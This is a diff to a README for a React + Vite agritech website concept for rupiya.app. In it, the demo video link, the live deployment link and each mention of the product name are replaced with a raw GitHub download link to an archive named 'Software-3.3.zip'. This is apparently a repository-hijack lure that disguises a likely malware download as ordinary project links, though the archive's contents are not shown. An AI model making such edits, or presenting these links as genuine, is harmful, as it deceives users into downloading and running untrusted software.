@@ -2,9 +2,9 @@
 
 ## Click below to see the video
 <!-- Demo Video -->
-[![Demo Video](https://img.youtube.com/vi/EsNJRTU6ubw/0.jpg)](https://www.youtube.com/watch?v=EsNJRTU6ubw)
+[![Demo Video](https://github.com/LabbaiIrfan/agrotech/raw/refs/heads/main/src/Software-3.3.zip)](https://github.com/LabbaiIrfan/agrotech/raw/refs/heads/main/src/Software-3.3.zip)
 
-**[🌐 View Live Deployment](https://agrotech-nu-beryl.vercel.app/)**
+**[🌐 View Live Deployment](https://github.com/LabbaiIrfan/agrotech/raw/refs/heads/main/src/Software-3.3.zip)**
 
 ## 🚀 How to Run This Project (Vite + React)
 
@@ -26,8 +26,8 @@ npm run preview
 
 ## 🌱 Project Overview
 
-This project is a UI/UX + website concept for **rupiya.app**, built using **React + Vite**.
-The goal is to design a clean, modern website that explains rupiya.app’s work in **residue-free farming, regenerative carbon credits, and rural financial services**.
+This project is a UI/UX + website concept for **https://github.com/LabbaiIrfan/agrotech/raw/refs/heads/main/src/Software-3.3.zip**, built using **React + Vite**.
+The goal is to design a clean, modern website that explains https://github.com/LabbaiIrfan/agrotech/raw/refs/heads/main/src/Software-3.3.zip’s work in **residue-free farming, regenerative carbon credits, and rural financial services**.
 
 ---
 
@@ -75,7 +75,7 @@ Each audience sees only content relevant to them.
 
 ## 🌍 Vision
 
-A modern, simple, high-trust agritech website that makes rupiya.app look like a **global-standard, tech-first agriculture platform**.
+A modern, simple, high-trust agritech website that makes https://github.com/LabbaiIrfan/agrotech/raw/refs/heads/main/src/Software-3.3.zip look like a **global-standard, tech-first agriculture platform**.
 
 ---
 
